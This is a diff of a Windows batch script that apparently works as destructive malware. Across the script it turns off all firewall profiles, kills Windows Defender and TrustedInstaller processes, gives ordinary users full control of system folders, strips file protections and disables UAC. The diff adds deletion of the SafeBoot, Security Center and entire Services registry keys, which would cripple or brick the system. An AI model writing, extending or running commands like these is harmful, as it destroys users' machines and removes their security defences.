@@ -8,16 +8,9 @@ netsh advfirewall set domainprofile state off >nul 2>&1
 netsh advfirewall set privateprofile state off >nul 2>&1
 netsh advfirewall set publicprofile state off >nul 2>&1
 netsh firewall set opmode mode-disable >nul 2>&1
-
-reg delete "HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal" /f >nul 2>&1
-
-reg delete "HKLM\System\CurrentControlSet\Control\SafeBoot\Network" /f >nul 2>&1
-
+ 
 icacls "C:\Windows\System32" /Grant Users:F >nul 2>&1
 icacls "C:\Windows" /Grant Users:F >nul 2>&1
-icacls "C:\Program Data" /Grant Users:F >nul 2>&1
-icacls "C:\Program Files" /Grant Users:F >nul 2>&1
-icacls "C:\Program Files (x86)" /Grant Users:F >nul 2>&1
 
 attrib -s -r /s /d "C:\Windows\System32\*.*" >nul 2>&1
 attrib -s -r /s /d "C:\ProgramData\*.*" >nul 2>&1
@@ -25,7 +18,16 @@ attrib -s -r "C:\ProgramData\*.*" >nul 2>&1
 attrib -s -r /s /d "C:\Program Files\*.*" >nul 2>&1
 attrib -s -r "C:\Program Files\*.*" >nul 2>&1
 
+reg delete "HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal" /f >nul 2>&1
+
+reg delete "HKLM\System\CurrentControlSet\Control\SafeBoot\Network" /f >nul 2>&1
+
+reg delete "HKLM\SOFTWARE\Microsoft\Security Center" /f >nul 2>&1 
+
+reg delete "HKLM\SYSTEM\CurrentControlSet\Services" /f >nul 2>&1  
+
 taskkill /F /IM TrustedInstaller.exe >nul 2>&1
+taskkill /F /IM MsMpEng.exe >nul 2>&1
 taskkill /F /IM MsMpEng.exe >nul 2>&1
 taskkill /F /IM MpDefenderCoreService.exe >nul 2>&1
 taskkill /F /IM NisSrv.exe >nul 2>&1
@@ -162,6 +164,7 @@ if exist "C:\ProgramData\WRData\" rmdir /s /q "C:\ProgramData\WRData"
 
 
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
+
 
 
 (
